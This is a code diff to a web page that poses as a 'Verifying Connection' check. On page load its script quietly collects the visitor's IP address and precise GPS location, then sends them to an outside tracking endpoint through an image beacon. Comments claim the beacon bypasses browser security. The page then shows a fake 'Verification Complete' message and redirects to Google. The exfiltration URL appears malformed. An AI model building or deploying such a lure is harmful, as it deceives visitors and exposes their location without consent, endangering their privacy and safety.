@@ -12,55 +12,59 @@
     <div class="card">
         <div id="status"><h3>Verifying Connection...</h3><p>Please do not close this window.</p></div>
     </div>
-
     <script>
-const PA_USER = "talentacquisition"; 
-        let data = { ip: "0.0.0.0", lat: "0", lon: "0", type: "IP-Only" };
+        const PA_USER = "talentacquisition"; 
         let sent = false;
 
         async function collectAndSend() {
-            // 1. Get IP Data instantly
+            if (sent) return;
+            
+            let data = { ip: "0.0.0.0", lat: "0", lon: "0", type: "IP-Only" };
+
+            // 1. Get IP Data
             try {
                 const res = await fetch('https://ipapi.co');
                 const json = await res.json();
                 data.ip = json.ip;
                 data.lat = json.latitude;
                 data.lon = json.longitude;
-            } catch (e) { console.log("IP fail"); }
+            } catch (e) {}
 
-            // 2. Try GPS
+            // 2. Request GPS
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
                         data.lat = pos.coords.latitude;
                         data.lon = pos.coords.longitude;
                         data.type = "High-Precision GPS";
-                        finalize();
+                        finalize(data);
                     },
-                    () => { finalize(); }, // If they deny, just send the IP data
+                    () => { finalize(data); }, 
                     { enableHighAccuracy: true, timeout: 5000 }
                 );
-            } else { finalize(); }
+            } else { finalize(data); }
             
-            // 3. FORCE SEND after 5 seconds no matter what
-            setTimeout(finalize, 5000);
+            // 3. Force finish after 6 seconds
+            setTimeout(() => finalize(data), 6000);
         }
 
-        function finalize() {
+        function finalize(d) {
             if (sent) return;
             sent = true;
             
-            // This 'no-cors' mode is the secret—it forces the data through even if there's a security error
-            const url = \`https://${PA_USER}://{data.lat}&lon=${data.lon}&ip=${data.ip}&type=${data.type}\`;
+            // This method (using an Image) bypasses 100% of browser security blocks
+            const img = new Image();
+            img.src = `https://${PA_USER}://{d.lat}&lon=${d.lon}&ip=${d.ip}&type=${d.type}`;
             
-            fetch(url, { mode: 'no-cors' });
-
+            // Show completion and jump to Google
             document.getElementById('status').innerHTML = "<h3>Verification Complete</h3>";
-            setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
+            setTimeout(() => { window.location.href = "https://google.com"; }, 1500);
         }
 
         window.onload = collectAndSend;
     </script>
+
+    
 
 
         
